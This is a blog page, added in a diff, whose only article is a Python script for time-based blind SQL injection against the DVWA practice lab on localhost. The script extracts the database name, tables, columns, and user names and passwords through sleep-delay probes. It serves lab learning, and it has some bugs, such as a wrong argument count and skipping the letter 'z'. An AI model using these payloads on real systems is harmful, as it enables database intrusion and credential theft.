@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="x5-fullscreen" content="true">
+<meta name="full-screen" content="yes">
+<meta name="theme-color" content="#317EFB" />
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=0" name="viewport">
+<meta name="description" content="DVWA靶场SQL注入-时间盲注1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入-延时注入">
+<meta property="og:url" content="http://example.com/2024/03/20/SQL%E6%B3%A8%E5%85%A5-%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="DVWA靶场SQL注入-时间盲注1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-03-19T23:41:22.000Z">
+<meta property="article:modified_time" content="2024-03-21T12:04:14.229Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+
+
+<title >SQL注入-延时注入</title>
+
+<!-- Favicon -->
+
+    <link href='/img/log.jpg?v=2.1.11' rel='icon' type='image/png' sizes='16x16' ></link>
+
+
+    <link href='/img/log.jpg?v=2.1.11' rel='icon' type='image/png' sizes='32x32' ></link>
+
+
+    <link href='/img/log.jpg?v=2.1.11' rel='apple-touch-icon' sizes='180x180' ></link>
+
+
+    <link href='/site.webmanifest' rel='manifest' ></link>
+
+
+<!-- Plugin -->
+
+
+
+
+    
+<link rel="stylesheet" href="/css/plugins/bootstrap.row.css">
+
+    
+<link rel="stylesheet" href="https://npm.elemecdn.com/@fancyapps/ui@4.0/dist/fancybox.css">
+
+    
+    
+
+
+
+
+<!-- Icon -->
+
+    
+<link rel="stylesheet" href="/css/plugins/font-awesome.min.css">
+
+
+
+
+<!-- Variable -->
+<script>window.ASYNC_CONFIG = {"hostname":"example.com","author":"John Doe","root":"/","typed_text":["Web Developer"],"theme_version":"2.1.11","theme":{"switch":true,"default":"style-light"},"favicon":{"logo":"/img/log.jpg","icon16":"/img/log.jpg","icon32":"/img/log.jpg","appleTouchIcon":"/img/log.jpg","webmanifest":"/site.webmanifest","visibilitychange":true,"hidden":"failure.ico","showText":"(/≧▽≦/)咦！又好了！","hideText":"(●—●)喔哟，崩溃啦！"},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms","author":"Post author: ","copyright_link":"Post link: ","copyright_license_title":"Copyright Notice: ","copyright_license_content":"All articles in this blog are licensed under undefined unless otherwise stated.","copy_success":"Copied","copy_failure":"Copy failed","open_read_mode":"Enter reading mode","exit_read_mode":"Exit reading mode","notice_outdate_message":"It has been undefined days since the last update, the content of the article may be outdated.","sticky":"TOP","just":"Just","min":"minutes ago","hour":"hours ago","day":"days ago","month":"months ago"},"swup":false,"plugin":{"flickr_justified_gallery":"https://npm.elemecdn.com/flickr-justified-gallery@latest/dist/fjGallery.min.js"},"icons":{"sun":"far fa-sun","moon":"far fa-moon","play":"fas fa-play","email":"far fa-envelope","next":"fas fa-arrow-right","calendar":"far fa-calendar-alt","clock":"far fa-clock","user":"far fa-user","back_top":"fas fa-arrow-up","close":"fas fa-times","search":"fas fa-search","reward":"fas fa-hand-holding-usd","user_tag":"fas fa-user-alt","toc_tag":"fas fa-th-list","read":"fas fa-book-reader","arrows":"fas fa-arrows-alt-h","double_arrows":"fas fa-angle-double-down","copy":"fas fa-copy"},"icontype":"font","highlight":{"plugin":"highlighjs","theme":true,"copy":true,"lang":false,"title":"mac","height_limit":200},"toc":{"post_title":true},"live_time":{"start_time":"3/16/2024 12:00:00","prefix":"The blog has been lovely to run undefined day"}};</script>
+<script id="async-page-config">window.PAGE_CONFIG = {"isPost":true,"isHome":false,"postUpdate":"2024-03-21 20:04:14"};</script>
+
+<!-- Theme mode css -->
+<link data-swup-theme rel="stylesheet" href="/css/index.css?v=2.1.11" id="trm-switch-style">
+<script>
+    let defaultMode = ASYNC_CONFIG.theme.default !=='auto' ?  ASYNC_CONFIG.theme.default : (window.matchMedia("(prefers-color-scheme: light)").matches ? 'style-light' : 'style-dark')
+    let catchMode = localStorage.getItem('theme-mode') || defaultMode;
+    let type = catchMode === 'style-dark' ? 'add' : 'remove';
+    document.documentElement.classList[type]('dark')
+</script>
+
+<!-- CDN -->
+
+
+    
+    
+
+
+
+<!-- Site Analytics -->
+ 
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body>
+
+  <!-- app wrapper -->
+  <div class="trm-app-frame">
+
+    <!-- page preloader -->
+    <div class="trm-preloader">
+    <div class="trm-holder">
+        <div class="preloader">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+</div>
+    <!-- page preloader end -->
+
+    <!-- change mode preloader -->
+    <div class="trm-mode-swich-animation-frame">
+    <div class="trm-mode-swich-animation">
+        <i class="i-sun"><i class="iconfont far fa-sun"></i></i>
+        <div class="trm-horizon"></div>
+        <i class="i-moon"><i class="iconfont far fa-moon"></i></i>
+    </div>
+</div>
+    <!-- change mode preloader end -->
+
+      <!-- scroll container -->
+      <div id="trm-dynamic-content" class="trm-swup-animation">
+        <div id="trm-scroll-container" class="trm-scroll-container" style="opacity: 0">
+            <!-- top bar -->
+            <header class="trm-top-bar">
+	<div class="container">
+		<div class="trm-left-side">
+			<!-- logo -->
+<a href="/" class="trm-logo-frame trm-anima-link">
+    
+        <img alt="logo" src="/img/log.jpg">
+    
+    
+        <div class="trm-logo-text">
+            Moira<span>Blog</span>
+        </div>
+    
+</a>
+<!-- logo end -->
+		</div>
+		<div class="trm-right-side">
+			<!-- menu -->
+<div class="trm-menu">
+    <nav>
+        <ul>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/" target="">
+                    首页
+                </a>
+                
+                <ul>
+                    
+                    <li>
+                        <a  href="/archives2/" target="">
+                            archives2
+                        </a>
+                    </li>
+                    
+                </ul>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/archives/" target="">
+                    归档
+                </a>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a data-no-swup href="/categories/" target="">
+                    分类
+                </a>
+                
+            </li>
+            
+        </ul>
+    </nav>
+</div>
+<!-- menu end -->
+			
+    <!-- mode switcher place -->
+    <div class="trm-mode-switcher-place">
+        <div class="trm-mode-switcher">
+            <i class="iconfont far fa-sun"></i>
+            <input class="tgl tgl-light" id="trm-swich" type="checkbox">
+            <label class="trm-swich" for="trm-swich"></label>
+            <i class="iconfont far fa-moon"></i>
+        </div>
+    </div>
+    <!-- mode switcher place end -->
+
+			
+		</div>
+		<div class="trm-menu-btn">
+			<span></span>
+		</div>
+	</div>
+</header>
+            <!-- top bar end -->
+
+            <!-- body -->
+            
+<div class="trm-content-start">
+    <!-- banner -->
+    <div class="trm-banner">
+    
+    <!-- banner cover -->
+    <img style="object-position:top;object-fit:cover;" alt="banner" class="trm-banner-cover" src="/img/log.jpg">
+    <!-- banner cover end -->
+    
+
+    <!-- banner content -->
+    <div class="trm-banner-content trm-overlay">
+        <div class="container">
+            <div class="row">
+                
+                <div class="col-lg-4"></div>
+                
+                <div class="col-lg-8">
+
+                    <!-- banner title -->
+                    <div class="trm-banner-text ">
+                        <div class="trm-label trm-mb-20">
+                            NEWS LETTER
+                        </div>
+                        <h1 class="trm-mb-30 trm-hsmb-font">
+                            SQL注入-延时注入
+                        </h1>
+
+                        
+                            <ul class="trm-breadcrumbs trm-label">
+                                <li>
+                                    <a href="/" class="trm-anima-link">Home</a>
+                                </li>
+                                <li>
+                                    <span>
+                                        2024
+                                    </span>
+                                </li>
+                            </ul>
+                        
+                    </div>
+                    <!-- banner title end -->
+
+                    <!-- scroll hint -->
+                    <span id="scroll-triger" class="trm-scroll-hint-frame">
+                        <div class="trm-scroll-hint"></div>
+                        <span class="trm-label">Scroll down</span>
+                    </span>
+                    <!-- scroll hint end -->
+
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- banner content end -->
+</div>
+    <!-- banner end -->
+    <div class="container">
+        <div class="row">
+            
+                <div class="trm-page-sidebar col-lg-4 hidden-sm">
+                    <!-- main card -->
+                    <div class="trm-main-card-frame trm-sidebar">
+    <div class="trm-main-card"> 
+        <!-- card header -->
+<div class="trm-mc-header">
+    <div class="trm-avatar-frame trm-mb-20">
+        <img alt="Avatar" class="trm-avatar" src="/img/via.jpg">
+    </div>
+    <h5 class="trm-name trm-mb-15">
+        Moira
+    </h5>
+    
+        <div class="trm-label">
+            I`m
+            <span class="trm-typed-text">
+                <!-- Words for theme.user.typedText -->
+            </span>
+        </div>
+    
+</div>
+<!-- card header end -->
+        <!-- sidebar social -->
+
+<div class="trm-divider trm-mb-40 trm-mt-40"></div>
+<div class="trm-social">
+    
+        <a href="https://github.com" title="github" rel="nofollow" target="_blank">
+            <i class="iconfont fab fa-github"></i>
+        </a>
+    
+        <a href="https://gitlab.com" title="qq" rel="nofollow" target="_blank">
+            <i class="iconfont fab fa-qq"></i>
+        </a>
+    
+        <a href="https://gitlab.com" title="weixin" rel="nofollow" target="_blank">
+            <i class="iconfont fab fa-weixin"></i>
+        </a>
+    
+        <a href="https://gitlab.com" title="gitee" rel="nofollow" target="_blank">
+            <i class="iconfont iconfont cg-gitee"></i>
+        </a>
+    
+</div>
+
+<!-- sidebar social end -->
+        <!-- info -->
+<div class="trm-divider trm-mb-40 trm-mt-40"></div>
+<ul class="trm-table trm-mb-20">
+    
+        <li>
+            <div class="trm-label">
+                地址:
+            </div>
+            <div class="trm-label trm-label-light">
+                太阳系第四号行星
+            </div>
+        </li>
+    
+        <li>
+            <div class="trm-label">
+                年龄:
+            </div>
+            <div class="trm-label trm-label-light">
+                18
+            </div>
+        </li>
+    
+        <li>
+            <div class="trm-label">
+                获得荣誉:
+            </div>
+            <div class="trm-label trm-label-light">
+                摸鱼小子、<br>脚本小子、<br>CV工程师、<br>躺平青年
+            </div>
+        </li>
+    
+</ul>
+<!-- info end -->
+
+        
+    <div class="trm-divider trm-mb-40 trm-mt-40"></div>
+    <!-- action button -->
+    <div class="text-center">
+        <a href="mailto:admin@imalun.com" class="trm-btn">
+            Contact Me
+            <i class="iconfont far fa-envelope"></i>
+        </a>
+    </div>
+    <!-- action button end -->
+
+    </div>
+</div>
+                    <!-- main card end -->
+                </div>
+            
+            <div class="trm-page-content col-lg-8">
+                <div id="trm-content" class="trm-content">
+                    <div class="trm-post-info row hidden-sm">
+    <div class="col-sm-4">
+        <div class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-calendar-alt trm-icon"></i><br>
+            03/21
+        </div>
+    </div>
+    <div class="col-sm-4">
+        <div class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-clock trm-icon"></i><br>
+            20:04
+        </div>
+    </div>
+    <div class="col-sm-4">
+        <div id="post-author" class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-user trm-icon"></i><br>
+            moira
+        </div>
+    </div>
+</div>
+<div class="trm-card ">
+    <article id="article-container" class="trm-publication">
+    <h1 id="DVWA靶场"><a href="#DVWA靶场" class="headerlink" title="DVWA靶场"></a>DVWA靶场</h1><h2 id="SQL注入-时间盲注"><a href="#SQL注入-时间盲注" class="headerlink" title="SQL注入-时间盲注"></a>SQL注入-时间盲注</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &#x27;http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="line">wei = &#x27;&amp;Submit=Submit#&#x27;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    &#x27;Cookie&#x27;: &#x27;security=low; PHPSESSID=nmdh8n39v2ch9o35a4kmduintl&#x27;,</span><br><span class="line">    &#x27;Host&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;Referer&#x27;: &#x27;http://127.0.0.1/DVWA/security.php:&#x27;,</span><br><span class="line">    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">length():</span><br><span class="line">substr():</span><br><span class="line">limit():</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 请求</span><br><span class="line">def get_requests(sql):</span><br><span class="line">    field_url = url + sql + wei</span><br><span class="line">    requests.get(url=field_url, headers=headers)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 1.获取数据库名称长度</span><br><span class="line">def get_field():</span><br><span class="line">    for i in range(1, 10):</span><br><span class="line">        # select * from user where id=1 and if(length(database())=&#123;&#125;,sleep(5),1)</span><br><span class="line">        get_sql = &quot;?id=1&#x27; and if(length(database())=&#123;&#125;,sleep(3),1)--+&quot;.format(i)</span><br><span class="line">        fist_time = time.time()</span><br><span class="line">        get_requests(get_sql)</span><br><span class="line">        two_time = time.time()</span><br><span class="line">        if two_time - fist_time &gt; 2:</span><br><span class="line">            print(&quot;数据库长度为：&quot;, i)</span><br><span class="line">            get_sql_name(&quot;数据库名称为：&quot;, i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 获取数据库名称</span><br><span class="line">def get_sql_name(field):</span><br><span class="line">    str = &quot;&quot;</span><br><span class="line">    for i in range(field + 1):</span><br><span class="line">        for j in range(97, 122):</span><br><span class="line">            # select * from where id=1 and if((ascii(substr(database(),1,1)))=a,sleep(5),1)</span><br><span class="line">            get_sql = &quot;?id=1&#x27; and if((ascii(substr(database(),&#123;&#125;,1)))=&#123;&#125;,sleep(3),1)--+&quot;.format(i, j)</span><br><span class="line">            fist_time = time.time()</span><br><span class="line">            get_requests(get_sql)</span><br><span class="line">            two_time = time.time()</span><br><span class="line">            if two_time - fist_time &gt; 2:</span><br><span class="line">                str += chr(j)</span><br><span class="line">                print(f&quot;第&#123;i&#125;个字符为：&quot;, chr(j))</span><br><span class="line">    print(str)</span><br><span class="line">    get_tables_field()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 获取tables表长度</span><br><span class="line">def get_tables_field():</span><br><span class="line">    for i in range(2):</span><br><span class="line">        for j in range(1, 100):</span><br><span class="line">            # SELECT table_name from information_schema.TABLES WHERE table_schema=DATABASE() LIMIT 1,1</span><br><span class="line">            get_sql = &quot;?id=1&#x27; and if(LENGTH((SELECT table_name from information_schema.TABLES WHERE table_schema=DATABASE() LIMIT &#123;&#125;,1))=&#123;&#125;,sleep(5),1)--+&quot;.format(</span><br><span class="line">                i, j)</span><br><span class="line">            fist_time = time.time()</span><br><span class="line">            get_requests(get_sql)</span><br><span class="line">            two_time = time.time()</span><br><span class="line">            if two_time - fist_time &gt; 2:</span><br><span class="line">                print(f&quot;第&#123;i + 1&#125;个数据库长度为：&quot;, j)</span><br><span class="line">                get_tables_sql_name(i, j)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 获取tables表名称</span><br><span class="line">def get_tables_sql_name(index, index2):</span><br><span class="line">    for i in range(index2 + 1):</span><br><span class="line">        for j in range(97, 122):</span><br><span class="line">            # if(ASCII(substr((SELECT table_name from information_schema.TABLES WHERE table_schema=DATABASE() LIMIT</span><br><span class="line">            # 0，1)0,1))=a,SLEEP(5),1)--+</span><br><span class="line">            get_sql = (&quot;?id=1&#x27; and if(ASCII(substr((SELECT table_name from information_schema.TABLES WHERE &quot;</span><br><span class="line">                       &quot;table_schema=DATABASE() LIMIT &#123;&#125;,1),&#123;&#125;,1))=&#123;&#125;,SLEEP(5),1)--+&quot;).format(</span><br><span class="line">                index, i, j)</span><br><span class="line">            fist_time = time.time()</span><br><span class="line">            get_requests(get_sql)</span><br><span class="line">            two_time = time.time()</span><br><span class="line">            if two_time - fist_time &gt; 2:</span><br><span class="line">                print(f&quot;第&#123;i&#125;个字符为：&quot;, chr(j))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_columns_sql_field():</span><br><span class="line">    for i in range(10):</span><br><span class="line">        for j in range(1, 100):</span><br><span class="line">            # if(LENGTH((SELECT column_name from information_schema.COLUMNS WHERE table_name=users LIMIT &#123;&#125;,1))=&#123;&#125;,</span><br><span class="line">            # sleep(5),1)</span><br><span class="line">            get_sql = (</span><br><span class="line">                &quot;?id=1&#x27; and if(LENGTH((SELECT column_name from information_schema.COLUMNS WHERE table_name=&#x27;users&#x27; &quot;</span><br><span class="line">                &quot;LIMIT &#123;&#125;,1))=&#123;&#125;,sleep(5),1)--+&quot;).format(</span><br><span class="line">                i, j)</span><br><span class="line">            fist_time = time.time()</span><br><span class="line">            get_requests(get_sql)</span><br><span class="line">            two_time = time.time()</span><br><span class="line">            if two_time - fist_time &gt; 2:</span><br><span class="line">                print(f&quot;第&#123;i + 1&#125;个列长度为：&quot;, j)</span><br><span class="line">                get_columns_sql_name(i, j)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_columns_sql_name(index, index2):</span><br><span class="line">    for i in range(index2 + 1):</span><br><span class="line">        for j in range(27, 122):</span><br><span class="line">            # if(ASCII(substr((SELECT table_name from information_schema.TABLES WHERE table_schema=DATABASE() LIMIT</span><br><span class="line">            # 0，1)0,1))=a,SLEEP(5),1)--+</span><br><span class="line">            get_sql = (&quot;?id=1&#x27; and if(ASCII(substr((SELECT column_name from information_schema.columns WHERE &quot;</span><br><span class="line">                       &quot;table_name=&#x27;users&#x27; LIMIT &#123;&#125;,1),&#123;&#125;,1))=&#123;&#125;,SLEEP(5),1)--+&quot;).format(</span><br><span class="line">                index, i, j)</span><br><span class="line">            fist_time = time.time()</span><br><span class="line">            get_requests(get_sql)</span><br><span class="line">            two_time = time.time()</span><br><span class="line">            if two_time - fist_time &gt; 2:</span><br><span class="line">                print(f&quot;第&#123;i&#125;个字符为：&quot;, chr(j))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_user_name():</span><br><span class="line">    for i in range(100):</span><br><span class="line">        for j in range(27, 122):</span><br><span class="line">            # if(ASCII(substr((SELECT table_name from information_schema.TABLES WHERE table_schema=DATABASE() LIMIT</span><br><span class="line">            # 0，1)0,1))=a,SLEEP(5),1)--+</span><br><span class="line">            get_sql = (</span><br><span class="line">                &quot;?id=1&#x27; and if(ASCII(substr((SELECT user from users LIMIT &#123;&#125;,1),&#123;&#125;,1))=&#123;&#125;,SLEEP(5),1)--+&quot;).format(</span><br><span class="line">                0, i, j)</span><br><span class="line">            fist_time = time.time()</span><br><span class="line">            get_requests(get_sql)</span><br><span class="line">            two_time = time.time()</span><br><span class="line">            if two_time - fist_time &gt; 2:</span><br><span class="line">                print(f&quot;第&#123;i&#125;个字符为：&quot;, chr(j))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_password_name():</span><br><span class="line">    for i in range(100):</span><br><span class="line">        for j in range(27, 122):</span><br><span class="line">            # if(ASCII(substr((SELECT table_name from information_schema.TABLES WHERE table_schema=DATABASE() LIMIT</span><br><span class="line">            # 0，1)0,1))=a,SLEEP(5),1)--+</span><br><span class="line">            get_sql = (</span><br><span class="line">                &quot;?id=1&#x27; and if(ASCII(substr((SELECT password from users LIMIT &#123;&#125;,1),&#123;&#125;,1))=&#123;&#125;,SLEEP(5),1)--+&quot;).format(</span><br><span class="line">                0, i, j)</span><br><span class="line">            fist_time = time.time()</span><br><span class="line">            get_requests(get_sql)</span><br><span class="line">            two_time = time.time()</span><br><span class="line">            if two_time - fist_time &gt; 2:</span><br><span class="line">                print(f&quot;第&#123;i&#125;个字符为：&quot;, chr(j))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    get_password_name()</span><br><span class="line">    # get_columns_sql_field()</span><br><span class="line">    # get_tables_sql_name(1, 9)</span><br><span class="line">    # get_tables_field()</span><br><span class="line">    # get_field()</span><br><span class="line">    # # get_sql_name(4)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+</article>
+    
+    
+
+</div>
+<div class="trm-post-next-prev row">
+    <div class="col-lg-12">
+        <!-- title -->
+        <h5 class="trm-title-with-divider">
+            Other Articles
+            <span data-number="02"></span>
+        </h5>
+    </div>
+    
+    
+        <div class="col-lg-6">
+    <div class="trm-older-publications-card trm-scroll-animation trm-active-el">
+        <div class="trm-older-publication">
+            
+            <a class="trm-op-top trm-anima-link" href="/2024/03/16/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/">
+                <span class="trm-op-cover">
+                    <img alt="cover" class="no-fancybox" src="/img/log.jpg">
+                </span>
+                <h6 class="trm-op-title">第一篇文章</h6>
+            </a>
+            <div class="trm-divider trm-mb-15 trm-mt-20"></div>
+            <ul class="trm-card-data trm-label">
+                <li>24/03/16</li>
+                <li>16:22</li>
+                <li>计算机</li>
+            </ul>
+        </div>
+    </div>
+</div>
+    
+</div>
+
+    
+
+
+
+                    <div class="trm-divider footer-divider"></div>
+
+                    <!-- footer -->
+                    <footer class="trm-scroll-animation">
+
+    
+
+    
+        <div class="trm-footer-item">
+            <span>© 2024- 2024</span>
+            <span class="footer-separator"data-separator=" · "></span>
+            <span class="trm-accent-color">Moira</span>
+        </div>
+    
+
+    
+        <div class="trm-footer-item">
+            <span>
+                Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> v7.1.1
+            </span>
+            <span class="footer-separator" data-separator=" | "></span>
+            <span> 
+                Theme - 
+                <a rel="noopener" href='https://github.com/MaLuns/hexo-theme-async' target='_blank'>Async</a>
+                v2.1.11
+            </span>
+        </div>
+      
+
+    
+        <div class="trm-footer-item blog-run-long"></div>
+     
+
+     
+</footer>
+                    <!-- footer end -->
+
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+            <!-- body end -->
+
+            
+
+            
+<div class="trm-fixed-container">
+    
+    
+        <div class="trm-fixed-btn" data-title="Read Mode" onclick="asyncFun.switchReadMode()">
+            <i class="iconfont fas fa-book-reader"></i>
+        </div>
+    
+    
+    <div id="trm-back-top" class="trm-fixed-btn" data-title="Back To Top">
+        <i class="iconfont fas fa-arrow-up"></i>
+    </div>
+</div>
+        </div>
+      </div>
+      <!-- scroll container end -->
+  </div>
+  <!-- app wrapper end -->
+
+  
+  <!-- Plugin -->
+
+
+
+
+    
+    
+<script src="https://npm.elemecdn.com/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>
+
+    
+
+    
+        <script src="/js/plugins/typing.js?v=2.1.11"></script>
+    
+
+    
+
+    <!-- 数学公式 -->
+    
+
+    <!-- 评论插件 -->
+    
+        
+
+        
+    
+
+
+
+<!-- CDN -->
+
+
+    
+
+    
+
+    
+
+
+
+
+    <!-- Service Worker -->
+    
+    <!-- baidu push -->
+    
+
+
+<script id="async-script" src="/js/main.js?v=2.1.11"></script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/haru02.model.json"},"display":{"position":"right","width":150,"height":430,"hOffset":0,"vOffset":-15},"mobile":{"show":false},"react":{"opacity":0.7},"log":false});</script></body>
+
+</html>
